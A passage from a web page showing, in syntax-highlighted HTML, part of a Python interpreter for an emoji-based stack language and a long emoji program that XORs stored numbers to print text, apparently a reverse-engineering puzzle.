<span class="token operator">-</span> a<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">if_zero</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>      <span class="token keyword">while</span> self<span class="token punctuation">.</span>rom<span class="token punctuation">[</span>self<span class="token punctuation">.</span>instruction_pointer<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'😐'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>rom<span class="token punctuation">[</span>self<span class="token punctuation">.</span>instruction_pointer<span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'🏀'</span><span class="token punctuation">,</span> <span class="token string">'⛰'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>          <span class="token keyword">break</span>        self<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      self<span class="token punctuation">.</span>find_first_endif<span class="token punctuation">(</span><span class="token punctuation">)</span>      self<span class="token punctuation">.</span>instruction_pointer <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token keyword">def</span> <span class="token function">if_not_zero</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>      <span class="token keyword">while</span> self<span class="token punctuation">.</span>rom<span class="token punctuation">[</span>self<span class="token punctuation">.</span>instruction_pointer<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'😐'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>rom<span class="token punctuation">[</span>self<span class="token punctuation">.</span>instruction_pointer<span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'🏀'</span><span class="token punctuation">,</span> <span class="token string">'⛰'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>          <span class="token keyword">break</span>        self<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      self<span class="token punctuation">.</span>find_first_endif<span class="token punctuation">(</span><span class="token punctuation">)</span>      self<span class="token punctuation">.</span>instruction_pointer <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token keyword">def</span> <span class="token function">find_first_endif</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> self<span class="token punctuation">.</span>rom<span class="token punctuation">[</span>self<span class="token punctuation">.</span>instruction_pointer<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'😐'</span><span class="token punctuation">:</span>      self<span class="token punctuation">.</span>instruction_pointer <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token keyword">def</span> <span class="token function">jump_to</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    marker <span class="token operator">=</span> self<span class="token punctuation">.</span>rom<span class="token punctuation">[</span>self<span class="token punctuation">.</span>instruction_pointer<span class="token punctuation">]</span>    <span class="token keyword">if</span> marker<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'💰'</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Incorrect symbol : '</span> <span class="token operator">+</span> marker<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token keyword">raise</span> SystemExit<span class="token punctuation">(</span><span class="token punctuation">)</span>    marker <span class="token operator">=</span> <span class="token string">'🖋'</span> <span class="token operator">+</span> marker<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    self<span class="token punctuation">.</span>instruction_pointer <span class="token operator">=</span> self<span class="token punctuation">.</span>rom<span class="token punctuation">.</span>index<span class="token punctuation">(</span>marker<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>  <span class="token keyword">def</span> <span class="token function">jump_top</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>instruction_pointer <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nDone.'</span><span class="token punctuation">)</span>    <span class="token keyword">raise</span> SystemExit<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">print_top</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">push</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> self<span class="token punctuation">.</span>rom<span class="token punctuation">[</span>self<span class="token punctuation">.</span>instruction_pointer<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'🥇'</span><span class="token punctuation">:</span>      self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>accumulator1<span class="token punctuation">)</span>    <span class="token keyword">elif</span> self<span class="token punctuation">.</span>rom<span class="token punctuation">[</span>self<span class="token punctuation">.</span>instruction_pointer<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'🥈'</span><span class="token punctuation">:</span>      self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>accumulator2<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">'Unknown instruction &#123;&#125; at position &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>          self<span class="token punctuation">.</span>rom<span class="token punctuation">[</span>self<span class="token punctuation">.</span>instruction_pointer<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>instruction_pointer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>instruction_pointer <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token keyword">def</span> <span class="token function">pop</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> self<span class="token punctuation">.</span>rom<span class="token punctuation">[</span>self<span class="token punctuation">.</span>instruction_pointer<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'🥇'</span><span class="token punctuation">:</span>      self<span class="token punctuation">.</span>accumulator1 <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> self<span class="token punctuation">.</span>rom<span class="token punctuation">[</span>self<span class="token punctuation">.</span>instruction_pointer<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'🥈'</span><span class="token punctuation">:</span>      self<span class="token punctuation">.</span>accumulator2 <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">'Unknown instruction &#123;&#125; at position &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>          self<span class="token punctuation">.</span>rom<span class="token punctuation">[</span>self<span class="token punctuation">.</span>instruction_pointer<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>instruction_pointer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>instruction_pointer <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token keyword">def</span> <span class="token function">pop_out</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">load</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">if</span> self<span class="token punctuation">.</span>rom<span class="token punctuation">[</span>self<span class="token punctuation">.</span>instruction_pointer<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'🥇'</span><span class="token punctuation">:</span>      acc <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">elif</span> self<span class="token punctuation">.</span>rom<span class="token punctuation">[</span>self<span class="token punctuation">.</span>instruction_pointer<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'🥈'</span><span class="token punctuation">:</span>      acc <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">'Unknown instruction &#123;&#125; at position &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>          self<span class="token punctuation">.</span>rom<span class="token punctuation">[</span>self<span class="token punctuation">.</span>instruction_pointer<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>instruction_pointer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>instruction_pointer <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">while</span> self<span class="token punctuation">.</span>rom<span class="token punctuation">[</span>self<span class="token punctuation">.</span>instruction_pointer<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'✋'</span><span class="token punctuation">:</span>      num <span class="token operator">=</span> num <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>rom<span class="token punctuation">[</span>self<span class="token punctuation">.</span>instruction_pointer<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      self<span class="token punctuation">.</span>instruction_pointer <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">if</span> acc <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>      self<span class="token punctuation">.</span>accumulator1 <span class="token operator">=</span> num    <span class="token keyword">else</span><span class="token punctuation">:</span>      self<span class="token punctuation">.</span>accumulator2 <span class="token operator">=</span> num    self<span class="token punctuation">.</span>instruction_pointer <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token keyword">def</span> <span class="token function">clone</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">multiply</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    b <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b <span class="token operator">*</span> a<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">divide</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    b <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b <span class="token operator">//</span> a<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">modulo</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    b <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b <span class="token operator">%</span> a<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    b <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b <span class="token operator">^</span> a<span class="token punctuation">)</span>  OPERATIONS <span class="token operator">=</span> <span class="token punctuation">&#123;</span>      <span class="token string">'🍡'</span><span class="token punctuation">:</span> add<span class="token punctuation">,</span>      <span class="token string">'🤡'</span><span class="token punctuation">:</span> clone<span class="token punctuation">,</span>      <span class="token string">'📐'</span><span class="token punctuation">:</span> divide<span class="token punctuation">,</span>      <span class="token string">'😲'</span><span class="token punctuation">:</span> if_zero<span class="token punctuation">,</span>      <span class="token string">'😄'</span><span class="token punctuation">:</span> if_not_zero<span class="token punctuation">,</span>      <span class="token string">'🏀'</span><span class="token punctuation">:</span> jump_to<span class="token punctuation">,</span>      <span class="token string">'🚛'</span><span class="token punctuation">:</span> load<span class="token punctuation">,</span>      <span class="token string">'📬'</span><span class="token punctuation">:</span> modulo<span class="token punctuation">,</span>      <span class="token string">'⭐'</span><span class="token punctuation">:</span> multiply<span class="token punctuation">,</span>      <span class="token string">'🍿'</span><span class="token punctuation">:</span> pop<span class="token punctuation">,</span>      <span class="token string">'📤'</span><span class="token punctuation">:</span> pop_out<span class="token punctuation">,</span>      <span class="token string">'🎤'</span><span class="token punctuation">:</span> print_top<span class="token punctuation">,</span>      <span class="token string">'📥'</span><span class="token punctuation">:</span> push<span class="token punctuation">,</span>      <span class="token string">'🔪'</span><span class="token punctuation">:</span> sub<span class="token punctuation">,</span>      <span class="token string">'🌓'</span><span class="token punctuation">:</span> xor<span class="token punctuation">,</span>      <span class="token string">'⛰'</span><span class="token punctuation">:</span> jump_top<span class="token punctuation">,</span>      <span class="token string">'⌛'</span><span class="token punctuation">:</span> exit  <span class="token punctuation">&#125;</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Missing program'</span><span class="token punctuation">)</span>    <span class="token keyword">raise</span> SystemExit<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Running ....'</span><span class="token punctuation">)</span>    all_ins <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span>    all_ins<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    vm <span class="token operator">=</span> VM<span class="token punctuation">(</span>all_ins<span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>      vm<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li>program</li></ul><pre class="language-none"><code class="language-none">🚛 🥇 0️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 7️⃣ 4️⃣ 8️⃣ 8️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 6️⃣ 7️⃣ 5️⃣ 8️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 6️⃣ 5️⃣ 9️⃣ 9️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 6️⃣ 2️⃣ 8️⃣ 5️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 6️⃣ 0️⃣ 9️⃣ 4️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 5️⃣ 5️⃣ 0️⃣ 5️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 5️⃣ 4️⃣ 1️⃣ 7️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 4️⃣ 8️⃣ 3️⃣ 2️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 4️⃣ 4️⃣ 5️⃣ 0️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 3️⃣ 8️⃣ 9️⃣ 3️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 3️⃣ 9️⃣ 2️⃣ 6️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 3️⃣ 4️⃣ 3️⃣ 7️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 2️⃣ 8️⃣ 3️⃣ 3️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 2️⃣ 7️⃣ 4️⃣ 1️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 2️⃣ 5️⃣ 3️⃣ 3️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 1️⃣ 5️⃣ 0️⃣ 4️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 1️⃣ 3️⃣ 4️⃣ 2️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 0️⃣ 5️⃣ 0️⃣ 3️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 0️⃣ 5️⃣ 5️⃣ 0️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 0️⃣ 3️⃣ 1️⃣ 9️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 7️⃣ 5️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 0️⃣ 0️⃣ 7️⃣ ✋ 📥 🥇🚛 🥇 8️⃣ 9️⃣ 2️⃣ ✋ 📥 🥇🚛 🥇 8️⃣ 9️⃣ 3️⃣ ✋ 📥 🥇🚛 🥇 6️⃣ 6️⃣ 0️⃣ ✋ 📥 🥇🚛 🥇 7️⃣ 4️⃣ 3️⃣ ✋ 📥 🥇🚛 🥇 2️⃣ 6️⃣ 7️⃣ ✋ 📥 🥇🚛 🥇 3️⃣ 4️⃣ 4️⃣ ✋ 📥 🥇🚛 🥇 2️⃣ 6️⃣ 4️⃣ ✋ 📥 🥇🚛 🥇 3️⃣ 3️⃣ 9️⃣ ✋ 📥 🥇🚛 🥇 2️⃣ 0️⃣ 8️⃣ ✋ 📥 🥇🚛 🥇 2️⃣ 1️⃣ 6️⃣ ✋ 📥 🥇🚛 🥇 2️⃣ 4️⃣ 2️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 7️⃣ 2️⃣ ✋ 📥 🥇🚛 🥇 7️⃣ 4️⃣ ✋ 📥 🥇🚛 🥇 4️⃣ 9️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 1️⃣ 9️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 1️⃣ 3️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 1️⃣ 9️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 0️⃣ 6️⃣ ✋ 📥 🥇🚛 🥈 1️⃣ ✋🖋💠🔶🎌🚩🏁 🍿 🥇 📥 🥈 📥 🥇 🚛 🥇 3️⃣ 8️⃣ 9️⃣ ✋📥 🥇 📥 🥈🏀 💰🏁🚩🎌💠🔶🌓 🎤🚛 🥇 1️⃣ ✋ 📥 🥇 🍡 🍿 🥈😄 🏀 💰💠🔶🎌🚩🏁 😐🚛 🥇 9️⃣ 8️⃣ 4️⃣ 2️⃣ 6️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 7️⃣ 8️⃣ 5️⃣ 0️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 7️⃣ 6️⃣ 0️⃣ 4️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 7️⃣ 2️⃣ 8️⃣ 0️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 6️⃣ 8️⃣ 1️⃣ 5️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 6️⃣ 4️⃣ 4️⃣ 3️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 6️⃣ 3️⃣ 5️⃣ 4️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 5️⃣ 9️⃣ 3️⃣ 4️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 4️⃣ 8️⃣ 6️⃣ 5️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 4️⃣ 9️⃣ 5️⃣ 2️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 4️⃣ 6️⃣ 6️⃣ 9️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 4️⃣ 4️⃣ 4️⃣ 0️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 3️⃣ 9️⃣ 6️⃣ 9️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 3️⃣ 7️⃣ 6️⃣ 6️⃣ ✋ 📥 🥇🚛 🥈 9️⃣ 9️⃣ ✋🖋💠🏁🎌🔶🚩 🍿 🥇 📥 🥈 📥 🥇 🚛 🥇 5️⃣ 6️⃣ 8️⃣ ✋📥 🥇 📥 🥈🏀 💰🏁🚩🎌💠🔶🌓 🎤🚛 🥇 1️⃣ ✋ 📥 🥇 🍡 🍿 🥈😄 🏀 💰💠🏁🎌🔶🚩 😐🚛 🥇 1️⃣ 0️⃣ 1️⃣ 1️⃣ 4️⃣ 1️⃣ 0️⃣ 5️⃣ 8️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 0️⃣ 1️⃣ 0️⃣ 6️⃣ 0️⃣ 2️⃣ 0️⃣ 6️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 0️⃣ 1️⃣ 0️⃣ 3️⃣ 0️⃣ 0️⃣ 5️⃣ 5️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 0️⃣ 0️⃣ 9️⃣ 9️⃣ 8️⃣ 9️⃣ 6️⃣ 6️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 0️⃣ 0️⃣ 8️⃣ 8️⃣ 7️⃣ 9️⃣ 9️⃣ 0️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 0️⃣ 0️⃣ 7️⃣ 6️⃣ 7️⃣ 0️⃣ 8️⃣ 5️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 0️⃣ 0️⃣ 7️⃣ 0️⃣ 7️⃣ 0️⃣ 3️⃣ 6️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 0️⃣ 0️⃣ 6️⃣ 5️⃣ 6️⃣ 1️⃣ 1️⃣ 1️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 0️⃣ 0️⃣ 4️⃣ 0️⃣ 4️⃣ 0️⃣ 9️⃣ 4️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 0️⃣ 0️⃣ 1️⃣ 6️⃣ 0️⃣ 9️⃣ 2️⃣ 2️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 0️⃣ 0️⃣ 1️⃣ 3️⃣ 1️⃣ 0️⃣ 1️⃣ 9️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 0️⃣ 0️⃣ 1️⃣ 1️⃣ 1️⃣ 1️⃣ 0️⃣ 0️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 0️⃣ 0️⃣ 0️⃣ 5️⃣ 9️⃣ 9️⃣ 2️⃣ 6️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 0️⃣ 0️⃣ 0️⃣ 4️⃣ 9️⃣ 9️⃣ 8️⃣ 2️⃣ ✋ 📥 🥇🚛 🥇 1️⃣ 0️⃣ 0️⃣ 0️⃣ 3️⃣ 0️⃣ 0️⃣ 4️⃣ 5️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 9️⃣ 8️⃣ 9️⃣ 9️⃣ 9️⃣ 7️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 9️⃣ 8️⃣ 1️⃣ 8️⃣ 5️⃣ 8️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 9️⃣ 8️⃣ 0️⃣ 8️⃣ 1️⃣ 5️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 9️⃣ 7️⃣ 8️⃣ 8️⃣ 4️⃣ 2️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 9️⃣ 6️⃣ 5️⃣ 7️⃣ 9️⃣ 4️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 9️⃣ 5️⃣ 7️⃣ 5️⃣ 6️⃣ 4️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 9️⃣ 3️⃣ 8️⃣ 3️⃣ 0️⃣ 4️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 9️⃣ 3️⃣ 5️⃣ 4️⃣ 2️⃣ 7️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 9️⃣ 3️⃣ 2️⃣ 2️⃣ 8️⃣ 9️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 9️⃣ 3️⃣ 1️⃣ 4️⃣ 9️⃣ 4️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 9️⃣ 2️⃣ 7️⃣ 3️⃣ 8️⃣ 8️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 9️⃣ 2️⃣ 6️⃣ 3️⃣ 7️⃣ 6️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 9️⃣ 2️⃣ 3️⃣ 2️⃣ 1️⃣ 3️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 9️⃣ 2️⃣ 1️⃣ 3️⃣ 9️⃣ 4️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 9️⃣ 1️⃣ 9️⃣ 1️⃣ 5️⃣ 4️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 9️⃣ 1️⃣ 8️⃣ 0️⃣ 8️⃣ 2️⃣ ✋ 📥 🥇🚛 🥇 9️⃣ 9️⃣ 1️⃣ 6️⃣ 2️⃣ 3️⃣ 9️⃣ ✋ 📥 🥇🚛 🥈 7️⃣ 6️⃣ 5️⃣ ✋🖋🚩💠🎌🔶🏁 🍿 🥇 📥 🥈 📥 🥇 🚛 🥇 1️⃣ 0️⃣ 2️⃣ 3️⃣ ✋📥 🥇 📥 🥈🏀 💰🏁🚩🎌💠🔶🌓 🎤🚛 🥇 1️⃣ ✋ 📥 🥇 🍡 🍿 🥈😄 🏀 💰🚩💠🎌🔶🏁 😐⌛🖋🏁🚩🎌💠🔶🚛 🥇 2️⃣ ✋ 📥 🥇 🖋💠🎌🏁🚩🔶🏀 💰🚩🔶🏁🎌💠🖋🔶🎌🚩💠🏁 😲 📤 🏀 💰🔶🚩💠🏁🎌 ✋ 😐📤 🏀 💰🎌🏁💠🔶🚩🖋🎌🏁🚩🔶💠 😲 📤 🏀 💰🔶🚩💠🏁🎌 😐📤 🍿 🥇 🚛 🥈 1️⃣ ✋ 📥 🥈 🔪😲 📤 🍿 🥈 📥 🥇 📥 🥈 ⛰ 😐 📥 🥇🖋🔶🚩💠🏁🎌 🚛 🥈 1️⃣ ✋ 📥 🥈 🍡 🏀 💰💠🎌🏁🚩🔶🖋🚩🔶🏁🎌💠🤡 🚛 🥇 2️⃣ ✋ 📥 🥇🖋🎌🚩💠🔶🏁 